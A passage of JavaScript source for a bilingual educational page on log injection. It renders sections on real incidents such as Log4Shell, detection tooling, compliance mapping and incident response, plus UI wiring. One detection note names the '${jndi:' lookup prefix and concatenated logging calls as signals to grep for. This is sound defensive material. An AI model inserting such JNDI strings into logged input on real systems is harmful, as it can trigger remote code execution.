    <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" target="_blank" rel="noopener">CISA Log4Shell AA21-356A</a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener">CVE-2021-44228</a>
    <a href="https://cwe.mitre.org/data/definitions/117.html" target="_blank" rel="noopener">CWE-117</a>
  </div>`;
  return secWrap('logi-incidents', lang === 'en' ? 'Real-world incidents' : 'Rzeczywiste incydenty',
    lang === 'en' ? 'Log injection is not theoretical — Log4Shell weaponized a logged string into CVSS 10.0 RCE, while SolarWinds and Equifax show log suppression as a stealth core.' : 'Log injection nie jest teoretyczne — Log4Shell uzbroił logowany string w RCE o CVSS 10.0, a SolarWinds i Equifax pokazują tłumienie logów jako rdzeń ukrywania.',
    `<div class="logi-incidents">${cards}</div>${sources}`);
}

function buildTools() {
  const lang = getLang();
  const sast = TOOLS.sast.map((t) => `<div class="logi-tool-row"><strong>${esc(t[0])}</strong><span>${esc(t[1])}</span></div>`).join('');
  const dast = TOOLS.dast.map((t) => `<div class="logi-tool-row"><strong>${esc(t[0])}</strong><span>${esc(t[1])}</span></div>`).join('');
  const note = lang === 'en'
    ? '<strong>Key signal:</strong> grep for log calls built by concatenation — <code>logger.info("..." + userInput)</code>, <code>f"...{user_input}"</code>, <code>error_log("..." . $_POST</code> — and for any <code>${jndi:</code> reaching a logged field.'
    : '<strong>Kluczowy sygnał:</strong> szukaj wywołań logów budowanych przez konkatenację — <code>logger.info("..." + userInput)</code>, <code>f"...{user_input}"</code>, <code>error_log("..." . $_POST</code> — oraz każdego <code>${jndi:</code> trafiającego do logowanego pola.';
  return secWrap('logi-tools', lang === 'en' ? 'Detection tooling' : 'Narzędzia wykrywania',
    lang === 'en' ? 'Static analysis catches input flowing into log sinks; dynamic tools confirm CRLF forging and JNDI exploitability. Use both.' : 'Analiza statyczna łapie wejście trafiające do sinków logów; narzędzia dynamiczne potwierdzają CRLF forging i eksploatowalność JNDI. Używaj obu.',
    `<div class="logi-tools-grid">
      <div class="logi-tool-col"><h4>SAST · ${lang === 'en' ? 'Static' : 'Statyczna'}</h4>${sast}</div>
      <div class="logi-tool-col"><h4>DAST · ${lang === 'en' ? 'Dynamic' : 'Dynamiczna'}</h4>${dast}</div>
    </div>
    <div class="logi-callout warn">${note}</div>`);
}

function buildCompliance() {
  const lang = getLang();
  const cards = COMPLIANCE.map((c) => `
    <article class="logi-comp-card">
      <h4>${esc(c.std)}</h4>
      <ul>${c.items.map((i) => `<li>${esc(i)}</li>`).join('')}</ul>
    </article>`).join('');
  const sources = `<div class="logi-inline-sources">${lang === 'en' ? 'Sources:' : 'Źródła:'}
    <a href="https://www.pcisecuritystandards.org/document_library/" target="_blank" rel="noopener">PCI DSS</a>
    <a href="https://gdpr-info.eu/art-5-gdpr/" target="_blank" rel="noopener">GDPR Art. 5</a>
    <a href="https://gdpr-info.eu/art-33-gdpr/" target="_blank" rel="noopener">GDPR Art. 33</a>
    <a href="https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security" target="_blank" rel="noopener">SOC 2 (AICPA)</a>
  </div>`;
  return secWrap('logi-compliance', lang === 'en' ? 'Compliance quick-reference' : 'Szybka zgodność',
    lang === 'en' ? 'Where log-injection prevention maps onto the integrity controls auditors check.' : 'Gdzie zapobieganie log injection mapuje się na kontrole integralności sprawdzane przez audytorów.',
    `<div class="logi-comp-grid">${cards}</div>${sources}`);
}

function buildIR() {
  const lang = getLang();
  const items = IR[lang].map((s, i) => `
    <li class="logi-ir-item"><span class="logi-ir-check">${i + 1}</span><span>${esc(s)}</span></li>`).join('');
  return secWrap('logi-ir', lang === 'en' ? 'Incident response checklist' : 'Lista kontrolna reagowania',
    lang === 'en' ? 'If you confirm an active log-injection breach, work this list top to bottom.' : 'Po potwierdzeniu aktywnego naruszenia log injection przejdź tę listę od góry.',
    `<ol class="logi-ir">${items}</ol>`);
}

function buildSourcesSection() {
  const lang = getLang();
  const links = SOURCES.map((s) =>
    `<a href="${s[1]}" target="_blank" rel="noopener" class="logi-source-link">${esc(s[0])}</a>`).join('');
  return secWrap('logi-sources', lang === 'en' ? 'Sources & references' : 'Źródła i odniesienia',
    lang === 'en' ? 'Primary references for the techniques, CVEs, and mitigations described above.' : 'Główne odniesienia do opisanych technik, CVE i środków zaradczych.',
    `<div class="logi-sources" style="margin-top:0">${links}</div>`);
}

function secWrap(id, title, lead, inner) {
  return `<section id="${id}" class="logi-section">
    <h2 class="logi-h2">${title}</h2>
    <p class="logi-section-lead">${lead}</p>
    ${inner}
  </section>`;
}

function buildContent() {
  return [
    buildOverview(),
    buildTypes(),
    buildCheatsheet(),
    buildCode(),
    buildOrm(),
    buildMethod(),
    buildDefense(),
    buildIncidents(),
    buildTools(),
    buildCompliance(),
    buildIR(),
    buildSourcesSection(),
    `<footer class="logi-footer">Code Guardian — Log Injection deep-dive · ${getLang() === 'en' ? 'All "VULNERABLE" examples are illustrative only — do not use in production.' : 'Wszystkie przykłady "PODATNY" są wyłącznie poglądowe — nie używaj na produkcji.'}</footer>`,
  ].join('');
}

/* =========================================================================
   WIRING
   ========================================================================= */

let highlighted = false;

function highlightOnce(panel) {
  if (highlighted) return;
  $$('code[class*="language-"]', panel).forEach((c) => highlightElement(c));
  highlighted = true;
}

function wireCopy(panel) {
  $$('.logi-copy', panel).forEach((btn) => {
    btn.addEventListener('click', () => {
      const code = $('code', btn.parentElement).textContent;
      const label = $('span', btn);
      const write = () => {
        const old = label.textContent;
        label.textContent = tr(TXT.copied);
        btn.classList.add('copied');
        setTimeout(() => { label.textContent = old; btn.classList.remove('copied'); }, 1400);
      };
      if (navigator.clipboard?.writeText) navigator.clipboard.writeText(code).then(write, write);
      else write();
    });
  });
}

function wireLangTabs(panel) {
  $$('.logi-lang-tab', panel).forEach((tab) => {
    tab.addEventListener('click', () => {
      const l = tab.dataset.lang;
      $$('.logi-lang-tab', panel).forEach((t) => t.classList.toggle('active', t === tab));
      $$('.logi-lang-panel', panel).forEach((p) => p.classList.toggle('active', p.dataset.lang === l));
    });
  });
}

function wireScrollSpy(panel) {
  const body = $('.logi-body', panel);
  const links = $$('.logi-nav-link', panel);
  links.forEach((link) => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      const target = $('#' + link.dataset.target, panel);
      if (target) body.scrollTo({ top: target.offsetTop - 24, behavior: 'smooth' });
    });
  });
  const sections = $$('.logi-section', panel);
  body.addEventListener('scroll', () => {
    let current = sections[0]?.id;
    for (const s of sections) {
      if (s.offsetTop - 80 <= body.scrollTop) current = s.id;
    }
    links.forEach((l) => l.classList.toggle('active', l.dataset.target === current));
  }, { passive: true });
}

function render(panel) {
  const lang = getLang();
  panel.innerHTML = `
    <div class="logi-topbar">
      <span class="logi-brand">${SVG.shield}<span>Code <span class="grad">Guardian</span></span></span>
      <span class="logi-topbar-title">Log Injection</span>
      <span style="flex:1"></span>
      <button class="logi-close" type="button" aria-label="${tr(TXT.close)}">${SVG.close}<span>${tr(TXT.close)}</span></button>
    </div>
    <div class="logi-shell">
      <nav class="logi-nav" aria-label="${lang === 'en' ? 'Page sections' : 'Sekcje strony'}">${buildNav()}</nav>
      <div class="logi-body">${buildContent()}</div>
    </div>`;
  highlighted = false;
  $('.logi-close', panel).addEventListener('click', close);
  wireCopy(panel);
  wireLangTabs(panel);
  wireScrollSpy(panel);
}

let _panel = null;
let _rendered = false;

function open() {
  if (!_panel) return;
  if (!_rendered) { render(_panel); _rendered = true; }
  _panel.classList.add('open');
  document.body.classList.add('logi-lock');
  highlightOnce(_panel);
  const body = $('.logi-body', _panel);
  if (body) body.scrollTop = 0;
}

function close() {
  if (!_panel) return;
  _panel.classList.remove('open');
  document.body.classList.remove('logi-lock');
}

export function openLogiPage() { open(); }

export function initLogiPage() {
  _panel = $('#logi-page');
  if (!_panel) return;

  // Re-render on language change so content tracks the global toggle.
  const langBtn = $('#lang-toggle');
  if (langBtn) {
    langBtn.addEventListener('click', () => {
      setTimeout(() => {
        if (_rendered) { const wasOpen = _panel.classList.contains('open'); render(_panel); if (wasOpen) { _panel.classList.add('open'); highlighted = false; highlightOnce(_panel); } }
      }, 0);
    });
  }

  const openBtn = $('#logi-tab');
  if (openBtn) openBtn.addEventListener('click', open);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && _panel.classList.contains('open')) close();
  });
}
